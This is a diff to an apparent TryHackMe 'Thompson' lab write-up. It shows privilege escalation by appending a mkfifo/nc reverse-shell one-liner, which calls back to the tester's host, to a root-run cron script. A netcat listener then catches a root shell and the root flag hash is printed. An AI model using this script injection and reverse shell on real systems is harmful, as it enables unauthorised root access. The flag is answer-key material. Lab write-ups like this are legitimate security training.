@@ -122,6 +122,9 @@ drwxrwxr-x 2 jack jack 4096 Aug 14  2019 .nano
 -rw-r--r-- 1 root root   39 Jun 18 02:17 test.txt
 -rw-rw-r-- 1 jack jack   33 Aug 14  2019 user.txt
 -rw-r--r-- 1 root root  183 Aug 14  2019 .wget-hsts
+
+looks like id.sh is runs every minute with root creads
+
 tomcat@ubuntu:/home/jack$ cat id.sh
 cat id.sh
 #!/bin/bash
@@ -130,3 +133,20 @@ tomcat@ubuntu:/home/jack$ echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc
 </f;cat /tmp/f|sh -i 2>&1|nc 10.8.28.108 9001 >/tmp/f" >> id.sh              
 
 ## Get root shell
+
+┌──(kali㉿kali)-[~/Documents/THM/THM_Thompson]
+└─$ nc -lvnp 9001                 
+listening on [any] 9001 ...
+connect to [10.8.28.108] from (UNKNOWN) [10.10.29.119] 33486
+sh: 0: can't access tty; job control turned off
+# # uid=0(root) gid=0(root) groups=0(root)
+# ls
+id.sh
+test.txt
+user.txt
+#  cd root
+# ls
+root.txt
+# cat root.txt
+d89d5391984c0450a95497153ae7ca3a
+
